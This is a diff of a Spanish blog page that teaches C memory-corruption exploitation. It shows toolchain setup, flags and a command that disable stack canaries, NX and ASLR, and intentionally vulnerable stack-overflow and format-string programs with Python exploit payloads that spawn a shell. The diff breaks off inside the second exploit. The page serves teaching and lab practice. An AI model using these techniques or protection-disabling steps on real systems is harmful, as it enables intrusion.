@@ -9,9 +9,7 @@
   <meta property="og:url" content="https://imlauera.github.io/how_easy_is_to_hack_c/">
 	<meta property="og:site_name" content="Imlauer">
 	<meta property="og:title" content="How easy is to hack C">
-	<meta property="og:description" content="Buena dirección — esto tiene DEMASIADO material para hacer un video viral. Te armo un ranking por impacto visual en pantalla (que se vea el “hack” o el crash con output dramático).
-Antes: tu mejor amigo para los demos Compilá siempre con sanitizers. El output es dorado para YouTube:
-gcc -g -fsanitize=address,undefined -o demo demo.c El AddressSanitizer (ASan) te tira mensajes coloridos, con backtrace, con un ASCII art de la memoria corrupta. Es 10x más impactante que un Segmentation fault pelado.">
+	<meta property="og:description" content="Vulnerabilidades en C y sus Exploits Flujo de trabajo para explotar cada vulnerabilidad Herramientas esenciales # Instalar pwntools (la navaja suiza del exploitation) pip install pwntools # GDB con pwndbg para debugging sudo apt install gdb git clone https://github.com/pwndbg/pwndbg &amp;&amp; cd pwndbg &amp;&amp; ./setup.sh # Verificar protecciones de un binario checksec --file=./vuln_bof Flags de compilación y qué deshabilitan Flag Protección que elimina -fno-stack-protector Stack canary (valor mágico que detecta BOF) -no-pie PIE/ASLR relativo (randomiza base del binario) -z execstack NX bit (permite ejecutar shellcode en el stack) -D_FORTIFY_SOURCE=0 Fortify (checks de funciones de string) echo 0 &gt; /proc/sys/kernel/randomize_va_space ASLR del sistema completo 1. Buffer Overflow (CWE-121) Código vulnerable // vuln_bof.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; void secret() { printf(&#34;¡Ganaste! RIP redirigido\n&#34;); system(&#34;/bin/sh&#34;); } void vulnerable(char *input) { char buf[64]; // buffer fijo strcpy(buf, input); // ← SIN verificar largo printf(&#34;Hola: %s\n&#34;, buf); } int main(int argc, char **argv) { vulnerable(argv[1]); return 0; } Exploit en Python # exploit_bof.py import subprocess import struct # 1. Buscar offset con pattern # gdb: pattern create 100 # run $(python3 -c &#34;print(&#39;Aa0A...&#39;)&#34;) # pattern offset $rip OFFSET = 72 # 64 buf &#43; 8 saved rbp # 2. Dirección de secret() # gdb: p secret → 0x401136 SECRET_ADDR = 0x401136 payload = b&#34;A&#34; * OFFSET payload &#43;= struct.pack(&#34;&lt;Q&#34;, SECRET_ADDR) print(payload.decode(&#34;latin-1&#34;)) Mapa de memoria del stack 0x7fff...10 [ buf[0..63] — 64 bytes ] ← inicio del buffer 0x7fff...50 [ saved RBP — 8 bytes ] 0x7fff...58 [ return address (RIP) ] ← target ↑ con overflow: A×72 &#43; &lt;addr secret&gt; overflow [ AAAA...AAAA &#43; \x36\x11\x40\x00... ] ← sobrescribe RIP Compilar y explotar gcc -o vuln_bof vuln_bof.c -fno-stack-protector -no-pie -z execstack ./vuln_bof $(python3 exploit_bof.py) gdb vuln_bof # para encontrar offset y dirección Cómo funciona el ataque strcpy no verifica largo — copia hasta encontrar \0, sin importar si hay espacio. Se sobreescribe la memoria adyacente — saved RBP y luego el return address (RIP). Al retornar la función, la CPU hace pop rip y salta a la dirección que pusimos. Ejecución redirigida a secret() que ejecuta /bin/sh. 2. Format String (CWE-134) Código vulnerable // vuln_fmtstr.c #include &lt;stdio.h&gt; int target = 0; int main(int argc, char **argv) { printf(&#34;target está en: %p\n&#34;, &amp;target); // ← VULNERABLE: el user controla el format string printf(argv[1]); printf(&#34;\ntarget = %d\n&#34;, target); if (target == 0x1337) { printf(&#34;¡Flag!\n&#34;); system(&#34;/bin/sh&#34;); } return 0; } Exploit en Python # exploit_fmtstr.py import subprocess from struct import pack # Paso 1: leer memoria con %p # ./vuln &#34;AAAA %p %p %p %p %p %p&#34; # Encontrar en qué posición aparece 0x41414141 # → esa es la posición directa: %N$ TARGET = 0x404048 # dirección de &#39;target&#39; VALUE = 0x1337 # valor a escribir (4919) # %N$n escribe N bytes impresos en la dirección # que está en el argumento N del stack # Usamos pwntools para facilitar: # from pwn import fmtstr_payload # payload = fmtstr_payload(6, {TARGET: VALUE}) # Manual: addr = pack(&#34;&lt;Q&#34;, TARGET) # Imprimir (VALUE - 8) caracteres, luego %6$n payload = addr &#43; b&#34;%4903c%6$n&#34; print(payload) Primitivas de lectura y escritura Leer memoria:">
 	<meta property="og:locale" content="es_es">
 	<meta property="og:type" content="article">
 		<meta property="article:published_time" content="2026-06-16T20:42:27-03:00">
@@ -20,19 +18,15 @@ gcc -g -fsanitize=address,undefined -o demo demo.c El AddressSanitizer (ASan) te
 
   
 	<meta itemprop="name" content="How easy is to hack C">
-	<meta itemprop="description" content="Buena dirección — esto tiene DEMASIADO material para hacer un video viral. Te armo un ranking por impacto visual en pantalla (que se vea el “hack” o el crash con output dramático).
-Antes: tu mejor amigo para los demos Compilá siempre con sanitizers. El output es dorado para YouTube:
-gcc -g -fsanitize=address,undefined -o demo demo.c El AddressSanitizer (ASan) te tira mensajes coloridos, con backtrace, con un ASCII art de la memoria corrupta. Es 10x más impactante que un Segmentation fault pelado.">
+	<meta itemprop="description" content="Vulnerabilidades en C y sus Exploits Flujo de trabajo para explotar cada vulnerabilidad Herramientas esenciales # Instalar pwntools (la navaja suiza del exploitation) pip install pwntools # GDB con pwndbg para debugging sudo apt install gdb git clone https://github.com/pwndbg/pwndbg &amp;&amp; cd pwndbg &amp;&amp; ./setup.sh # Verificar protecciones de un binario checksec --file=./vuln_bof Flags de compilación y qué deshabilitan Flag Protección que elimina -fno-stack-protector Stack canary (valor mágico que detecta BOF) -no-pie PIE/ASLR relativo (randomiza base del binario) -z execstack NX bit (permite ejecutar shellcode en el stack) -D_FORTIFY_SOURCE=0 Fortify (checks de funciones de string) echo 0 &gt; /proc/sys/kernel/randomize_va_space ASLR del sistema completo 1. Buffer Overflow (CWE-121) Código vulnerable // vuln_bof.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; void secret() { printf(&#34;¡Ganaste! RIP redirigido\n&#34;); system(&#34;/bin/sh&#34;); } void vulnerable(char *input) { char buf[64]; // buffer fijo strcpy(buf, input); // ← SIN verificar largo printf(&#34;Hola: %s\n&#34;, buf); } int main(int argc, char **argv) { vulnerable(argv[1]); return 0; } Exploit en Python # exploit_bof.py import subprocess import struct # 1. Buscar offset con pattern # gdb: pattern create 100 # run $(python3 -c &#34;print(&#39;Aa0A...&#39;)&#34;) # pattern offset $rip OFFSET = 72 # 64 buf &#43; 8 saved rbp # 2. Dirección de secret() # gdb: p secret → 0x401136 SECRET_ADDR = 0x401136 payload = b&#34;A&#34; * OFFSET payload &#43;= struct.pack(&#34;&lt;Q&#34;, SECRET_ADDR) print(payload.decode(&#34;latin-1&#34;)) Mapa de memoria del stack 0x7fff...10 [ buf[0..63] — 64 bytes ] ← inicio del buffer 0x7fff...50 [ saved RBP — 8 bytes ] 0x7fff...58 [ return address (RIP) ] ← target ↑ con overflow: A×72 &#43; &lt;addr secret&gt; overflow [ AAAA...AAAA &#43; \x36\x11\x40\x00... ] ← sobrescribe RIP Compilar y explotar gcc -o vuln_bof vuln_bof.c -fno-stack-protector -no-pie -z execstack ./vuln_bof $(python3 exploit_bof.py) gdb vuln_bof # para encontrar offset y dirección Cómo funciona el ataque strcpy no verifica largo — copia hasta encontrar \0, sin importar si hay espacio. Se sobreescribe la memoria adyacente — saved RBP y luego el return address (RIP). Al retornar la función, la CPU hace pop rip y salta a la dirección que pusimos. Ejecución redirigida a secret() que ejecuta /bin/sh. 2. Format String (CWE-134) Código vulnerable // vuln_fmtstr.c #include &lt;stdio.h&gt; int target = 0; int main(int argc, char **argv) { printf(&#34;target está en: %p\n&#34;, &amp;target); // ← VULNERABLE: el user controla el format string printf(argv[1]); printf(&#34;\ntarget = %d\n&#34;, target); if (target == 0x1337) { printf(&#34;¡Flag!\n&#34;); system(&#34;/bin/sh&#34;); } return 0; } Exploit en Python # exploit_fmtstr.py import subprocess from struct import pack # Paso 1: leer memoria con %p # ./vuln &#34;AAAA %p %p %p %p %p %p&#34; # Encontrar en qué posición aparece 0x41414141 # → esa es la posición directa: %N$ TARGET = 0x404048 # dirección de &#39;target&#39; VALUE = 0x1337 # valor a escribir (4919) # %N$n escribe N bytes impresos en la dirección # que está en el argumento N del stack # Usamos pwntools para facilitar: # from pwn import fmtstr_payload # payload = fmtstr_payload(6, {TARGET: VALUE}) # Manual: addr = pack(&#34;&lt;Q&#34;, TARGET) # Imprimir (VALUE - 8) caracteres, luego %6$n payload = addr &#43; b&#34;%4903c%6$n&#34; print(payload) Primitivas de lectura y escritura Leer memoria:">
 	<meta itemprop="datePublished" content="2026-06-16T20:42:27-03:00">
 	<meta itemprop="dateModified" content="2026-06-16T20:42:27-03:00">
-	<meta itemprop="wordCount" content="1779">
+	<meta itemprop="wordCount" content="3062">
 	<meta itemprop="keywords" content="C">
   
 	<meta name="twitter:card" content="summary">
 	<meta name="twitter:title" content="How easy is to hack C">
-	<meta name="twitter:description" content="Buena dirección — esto tiene DEMASIADO material para hacer un video viral. Te armo un ranking por impacto visual en pantalla (que se vea el “hack” o el crash con output dramático).
-Antes: tu mejor amigo para los demos Compilá siempre con sanitizers. El output es dorado para YouTube:
-gcc -g -fsanitize=address,undefined -o demo demo.c El AddressSanitizer (ASan) te tira mensajes coloridos, con backtrace, con un ASCII art de la memoria corrupta. Es 10x más impactante que un Segmentation fault pelado.">
+	<meta name="twitter:description" content="Vulnerabilidades en C y sus Exploits Flujo de trabajo para explotar cada vulnerabilidad Herramientas esenciales # Instalar pwntools (la navaja suiza del exploitation) pip install pwntools # GDB con pwndbg para debugging sudo apt install gdb git clone https://github.com/pwndbg/pwndbg &amp;&amp; cd pwndbg &amp;&amp; ./setup.sh # Verificar protecciones de un binario checksec --file=./vuln_bof Flags de compilación y qué deshabilitan Flag Protección que elimina -fno-stack-protector Stack canary (valor mágico que detecta BOF) -no-pie PIE/ASLR relativo (randomiza base del binario) -z execstack NX bit (permite ejecutar shellcode en el stack) -D_FORTIFY_SOURCE=0 Fortify (checks de funciones de string) echo 0 &gt; /proc/sys/kernel/randomize_va_space ASLR del sistema completo 1. Buffer Overflow (CWE-121) Código vulnerable // vuln_bof.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; void secret() { printf(&#34;¡Ganaste! RIP redirigido\n&#34;); system(&#34;/bin/sh&#34;); } void vulnerable(char *input) { char buf[64]; // buffer fijo strcpy(buf, input); // ← SIN verificar largo printf(&#34;Hola: %s\n&#34;, buf); } int main(int argc, char **argv) { vulnerable(argv[1]); return 0; } Exploit en Python # exploit_bof.py import subprocess import struct # 1. Buscar offset con pattern # gdb: pattern create 100 # run $(python3 -c &#34;print(&#39;Aa0A...&#39;)&#34;) # pattern offset $rip OFFSET = 72 # 64 buf &#43; 8 saved rbp # 2. Dirección de secret() # gdb: p secret → 0x401136 SECRET_ADDR = 0x401136 payload = b&#34;A&#34; * OFFSET payload &#43;= struct.pack(&#34;&lt;Q&#34;, SECRET_ADDR) print(payload.decode(&#34;latin-1&#34;)) Mapa de memoria del stack 0x7fff...10 [ buf[0..63] — 64 bytes ] ← inicio del buffer 0x7fff...50 [ saved RBP — 8 bytes ] 0x7fff...58 [ return address (RIP) ] ← target ↑ con overflow: A×72 &#43; &lt;addr secret&gt; overflow [ AAAA...AAAA &#43; \x36\x11\x40\x00... ] ← sobrescribe RIP Compilar y explotar gcc -o vuln_bof vuln_bof.c -fno-stack-protector -no-pie -z execstack ./vuln_bof $(python3 exploit_bof.py) gdb vuln_bof # para encontrar offset y dirección Cómo funciona el ataque strcpy no verifica largo — copia hasta encontrar \0, sin importar si hay espacio. Se sobreescribe la memoria adyacente — saved RBP y luego el return address (RIP). Al retornar la función, la CPU hace pop rip y salta a la dirección que pusimos. Ejecución redirigida a secret() que ejecuta /bin/sh. 2. Format String (CWE-134) Código vulnerable // vuln_fmtstr.c #include &lt;stdio.h&gt; int target = 0; int main(int argc, char **argv) { printf(&#34;target está en: %p\n&#34;, &amp;target); // ← VULNERABLE: el user controla el format string printf(argv[1]); printf(&#34;\ntarget = %d\n&#34;, target); if (target == 0x1337) { printf(&#34;¡Flag!\n&#34;); system(&#34;/bin/sh&#34;); } return 0; } Exploit en Python # exploit_fmtstr.py import subprocess from struct import pack # Paso 1: leer memoria con %p # ./vuln &#34;AAAA %p %p %p %p %p %p&#34; # Encontrar en qué posición aparece 0x41414141 # → esa es la posición directa: %N$ TARGET = 0x404048 # dirección de &#39;target&#39; VALUE = 0x1337 # valor a escribir (4919) # %N$n escribe N bytes impresos en la dirección # que está en el argumento N del stack # Usamos pwntools para facilitar: # from pwn import fmtstr_payload # payload = fmtstr_payload(6, {TARGET: VALUE}) # Manual: addr = pack(&#34;&lt;Q&#34;, TARGET) # Imprimir (VALUE - 8) caracteres, luego %6$n payload = addr &#43; b&#34;%4903c%6$n&#34; print(payload) Primitivas de lectura y escritura Leer memoria:">
 
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -50,11 +44,159 @@ gcc -g -fsanitize=address,undefined -o demo demo.c El AddressSanitizer (ASan) te
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="referrer" content="no-referrer">
   <meta name="author" content="Imlauer.">
-  <meta name="description" content="Buena dirección — esto tiene DEMASIADO material para hacer un video viral. Te armo un ranking por impacto visual en pantalla (que se vea el &ldquo;hack&rdquo; o el crash con output dramático).
-Antes: tu mejor amigo para los demos
-Compilá siempre con sanitizers. El output es dorado para YouTube:
-gcc -g -fsanitize=address,undefined -o demo demo.c
-El AddressSanitizer (ASan) te tira mensajes coloridos, con backtrace, con un ASCII art de la memoria corrupta. Es 10x más impactante que un Segmentation fault pelado.">
+  <meta name="description" content="Vulnerabilidades en C y sus Exploits
+Flujo de trabajo para explotar cada vulnerabilidad
+
+Herramientas esenciales
+# Instalar pwntools (la navaja suiza del exploitation)
+pip install pwntools
+
+# GDB con pwndbg para debugging
+sudo apt install gdb
+git clone https://github.com/pwndbg/pwndbg &amp;&amp; cd pwndbg &amp;&amp; ./setup.sh
+
+# Verificar protecciones de un binario
+checksec --file=./vuln_bof
+
+Flags de compilación y qué deshabilitan
+
+	
+			
+					Flag
+					Protección que elimina
+			
+	
+	
+			
+					-fno-stack-protector
+					Stack canary (valor mágico que detecta BOF)
+			
+			
+					-no-pie
+					PIE/ASLR relativo (randomiza base del binario)
+			
+			
+					-z execstack
+					NX bit (permite ejecutar shellcode en el stack)
+			
+			
+					-D_FORTIFY_SOURCE=0
+					Fortify (checks de funciones de string)
+			
+			
+					echo 0 &gt; /proc/sys/kernel/randomize_va_space
+					ASLR del sistema completo
+			
+	
+
+
+1. Buffer Overflow (CWE-121)
+Código vulnerable
+// vuln_bof.c
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void secret() {
+    printf(&#34;¡Ganaste! RIP redirigido\n&#34;);
+    system(&#34;/bin/sh&#34;);
+}
+
+void vulnerable(char *input) {
+    char buf[64];         // buffer fijo
+    strcpy(buf, input);   // ← SIN verificar largo
+    printf(&#34;Hola: %s\n&#34;, buf);
+}
+
+int main(int argc, char **argv) {
+    vulnerable(argv[1]);
+    return 0;
+}
+Exploit en Python
+# exploit_bof.py
+import subprocess
+import struct
+
+# 1. Buscar offset con pattern
+#    gdb: pattern create 100
+#    run $(python3 -c &#34;print(&#39;Aa0A...&#39;)&#34;)
+#    pattern offset $rip
+
+OFFSET = 72   # 64 buf &#43; 8 saved rbp
+
+# 2. Dirección de secret()
+#    gdb: p secret → 0x401136
+SECRET_ADDR = 0x401136
+
+payload = b&#34;A&#34; * OFFSET
+payload &#43;= struct.pack(&#34;&lt;Q&#34;, SECRET_ADDR)
+
+print(payload.decode(&#34;latin-1&#34;))
+Mapa de memoria del stack
+0x7fff...10  [ buf[0..63] — 64 bytes        ]  ← inicio del buffer
+0x7fff...50  [ saved RBP  — 8 bytes         ]
+0x7fff...58  [ return address (RIP)         ]  ← target
+             ↑ con overflow: A×72 &#43; &lt;addr secret&gt;
+overflow     [ AAAA...AAAA &#43; \x36\x11\x40\x00... ]  ← sobrescribe RIP
+Compilar y explotar
+gcc -o vuln_bof vuln_bof.c -fno-stack-protector -no-pie -z execstack
+./vuln_bof $(python3 exploit_bof.py)
+gdb vuln_bof   # para encontrar offset y dirección
+Cómo funciona el ataque
+
+strcpy no verifica largo — copia hasta encontrar \0, sin importar si hay espacio.
+Se sobreescribe la memoria adyacente — saved RBP y luego el return address (RIP).
+Al retornar la función, la CPU hace pop rip y salta a la dirección que pusimos.
+Ejecución redirigida a secret() que ejecuta /bin/sh.
+
+
+2. Format String (CWE-134)
+Código vulnerable
+// vuln_fmtstr.c
+#include &lt;stdio.h&gt;
+
+int target = 0;
+
+int main(int argc, char **argv) {
+    printf(&#34;target está en: %p\n&#34;, &amp;target);
+
+    // ← VULNERABLE: el user controla el format string
+    printf(argv[1]);
+
+    printf(&#34;\ntarget = %d\n&#34;, target);
+
+    if (target == 0x1337) {
+        printf(&#34;¡Flag!\n&#34;);
+        system(&#34;/bin/sh&#34;);
+    }
+    return 0;
+}
+Exploit en Python
+# exploit_fmtstr.py
+import subprocess
+from struct import pack
+
+# Paso 1: leer memoria con %p
+# ./vuln &#34;AAAA %p %p %p %p %p %p&#34;
+# Encontrar en qué posición aparece 0x41414141
+# → esa es la posición directa: %N$
+
+TARGET = 0x404048  # dirección de &#39;target&#39;
+VALUE  = 0x1337   # valor a escribir (4919)
+
+# %N$n escribe N bytes impresos en la dirección
+# que está en el argumento N del stack
+
+# Usamos pwntools para facilitar:
+# from pwn import fmtstr_payload
+# payload = fmtstr_payload(6, {TARGET: VALUE})
+
+# Manual:
+addr = pack(&#34;&lt;Q&#34;, TARGET)
+# Imprimir (VALUE - 8) caracteres, luego %6$n
+payload = addr &#43; b&#34;%4903c%6$n&#34;
+print(payload)
+Primitivas de lectura y escritura
+Leer memoria:">
 </head>
 <body><nav class="navbar is-transparent " role="navigation" aria-label="main navigation">
   <div class="navbar-brand">
@@ -102,7 +244,364 @@ El AddressSanitizer (ASan) te tira mensajes coloridos, con backtrace, con un ASC
     <section class="section">
       <div class="container">
 <div class="content is-medium">
-  <p>Buena dirección — esto tiene DEMASIADO material para hacer un video viral. Te armo un ranking por <strong>impacto visual en pantalla</strong> (que se vea el &ldquo;hack&rdquo; o el crash con output dramático).</p>
+  <h1 id="vulnerabilidades-en-c-y-sus-exploits">Vulnerabilidades en C y sus Exploits</h1>
+<h2 id="flujo-de-trabajo-para-explotar-cada-vulnerabilidad">Flujo de trabajo para explotar cada vulnerabilidad</h2>
+<hr>
+<h2 id="herramientas-esenciales">Herramientas esenciales</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Instalar pwntools (la navaja suiza del exploitation)</span>
+</span></span><span style="display:flex;"><span>pip install pwntools
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># GDB con pwndbg para debugging</span>
+</span></span><span style="display:flex;"><span>sudo apt install gdb
+</span></span><span style="display:flex;"><span>git clone https://github.com/pwndbg/pwndbg <span style="color:#f92672">&amp;&amp;</span> cd pwndbg <span style="color:#f92672">&amp;&amp;</span> ./setup.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Verificar protecciones de un binario</span>
+</span></span><span style="display:flex;"><span>checksec --file<span style="color:#f92672">=</span>./vuln_bof
+</span></span></code></pre></div><hr>
+<h2 id="flags-de-compilación-y-qué-deshabilitan">Flags de compilación y qué deshabilitan</h2>
+<table>
+	<thead>
+			<tr>
+					<th>Flag</th>
+					<th>Protección que elimina</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>-fno-stack-protector</code></td>
+					<td>Stack canary (valor mágico que detecta BOF)</td>
+			</tr>
+			<tr>
+					<td><code>-no-pie</code></td>
+					<td>PIE/ASLR relativo (randomiza base del binario)</td>
+			</tr>
+			<tr>
+					<td><code>-z execstack</code></td>
+					<td>NX bit (permite ejecutar shellcode en el stack)</td>
+			</tr>
+			<tr>
+					<td><code>-D_FORTIFY_SOURCE=0</code></td>
+					<td>Fortify (checks de funciones de string)</td>
+			</tr>
+			<tr>
+					<td><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></td>
+					<td>ASLR del sistema completo</td>
+			</tr>
+	</tbody>
+</table>
+<hr>
+<h2 id="1-buffer-overflow-cwe-121">1. Buffer Overflow (CWE-121)</h2>
+<h3 id="código-vulnerable">Código vulnerable</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_bof.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">secret</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;¡Ganaste! RIP redirigido</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vulnerable</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>input) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">64</span>];         <span style="color:#75715e">// buffer fijo
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(buf, input);   <span style="color:#75715e">// ← SIN verificar largo
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Hola: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buf);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">vulnerable</span>(argv[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="exploit-en-python">Exploit en Python</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># exploit_bof.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. Buscar offset con pattern</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#    gdb: pattern create 100</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#    run $(python3 -c &#34;print(&#39;Aa0A...&#39;)&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#    pattern offset $rip</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OFFSET <span style="color:#f92672">=</span> <span style="color:#ae81ff">72</span>   <span style="color:#75715e"># 64 buf + 8 saved rbp</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. Dirección de secret()</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#    gdb: p secret → 0x401136</span>
+</span></span><span style="display:flex;"><span>SECRET_ADDR <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401136</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> OFFSET
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;Q&#34;</span>, SECRET_ADDR)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(payload<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;latin-1&#34;</span>))
+</span></span></code></pre></div><h3 id="mapa-de-memoria-del-stack">Mapa de memoria del stack</h3>
+<pre tabindex="0"><code>0x7fff...10  [ buf[0..63] — 64 bytes        ]  ← inicio del buffer
+0x7fff...50  [ saved RBP  — 8 bytes         ]
+0x7fff...58  [ return address (RIP)         ]  ← target
+             ↑ con overflow: A×72 + &lt;addr secret&gt;
+overflow     [ AAAA...AAAA + \x36\x11\x40\x00... ]  ← sobrescribe RIP
+</code></pre><h3 id="compilar-y-explotar">Compilar y explotar</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -o vuln_bof vuln_bof.c -fno-stack-protector -no-pie -z execstack
+</span></span><span style="display:flex;"><span>./vuln_bof <span style="color:#66d9ef">$(</span>python3 exploit_bof.py<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>gdb vuln_bof   <span style="color:#75715e"># para encontrar offset y dirección</span>
+</span></span></code></pre></div><h3 id="cómo-funciona-el-ataque">Cómo funciona el ataque</h3>
+<ol>
+<li><code>strcpy</code> no verifica largo — copia hasta encontrar <code>\0</code>, sin importar si hay espacio.</li>
+<li>Se sobreescribe la memoria adyacente — saved RBP y luego el return address (RIP).</li>
+<li>Al retornar la función, la CPU hace <code>pop rip</code> y salta a la dirección que pusimos.</li>
+<li>Ejecución redirigida a <code>secret()</code> que ejecuta <code>/bin/sh</code>.</li>
+</ol>
+<hr>
+<h2 id="2-format-string-cwe-134">2. Format String (CWE-134)</h2>
+<h3 id="código-vulnerable-1">Código vulnerable</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_fmtstr.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> target <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;target está en: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>target);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ← VULNERABLE: el user controla el format string
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(argv[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">target = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, target);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (target <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x1337</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;¡Flag!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="exploit-en-python-1">Exploit en Python</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># exploit_fmtstr.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> struct <span style="color:#f92672">import</span> pack
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 1: leer memoria con %p</span>
